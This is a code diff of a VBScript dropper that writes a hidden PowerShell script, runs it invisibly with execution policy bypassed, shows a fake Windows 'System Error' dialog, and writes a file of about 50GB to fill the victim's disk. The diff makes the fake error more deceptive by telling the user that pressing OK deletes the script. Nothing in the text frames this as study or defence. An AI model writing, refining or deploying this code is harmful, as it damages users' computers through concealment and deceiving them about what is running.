@@ -22,7 +22,7 @@ Set psFile = fso.CreateTextFile(psPath, True)
 psFile.WriteLine "$TargetDir = '" & CurrentDir & "'"
 psFile.WriteLine "$BigFile = Join-Path $TargetDir 'core_dump.txt'"
 psFile.WriteLine "Add-Type -AssemblyName PresentationFramework"
-psFile.WriteLine "[System.Windows.MessageBox]::Show('Windows Version Error: build 23H2 incompatible.', 'System Error', 0, 16)"
+psFile.WriteLine "[System.Windows.MessageBox]::Show('Windows Version Error: build 23H2 incompatible, Press OK to delete this script', 'System Error', 0, 16)"
 psFile.WriteLine "$Stream = [System.IO.File]::OpenWrite($BigFile)"
 psFile.WriteLine "$Buffer = New-Object Byte[] 1048576"
 ' 循环 51200 次 = 50GB
@@ -33,6 +33,7 @@ psFile.Close
 
 fso.GetFile(psPath).Attributes = 2 + 4
 WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & psPath & Chr(34), 0, False
+
 
 
 
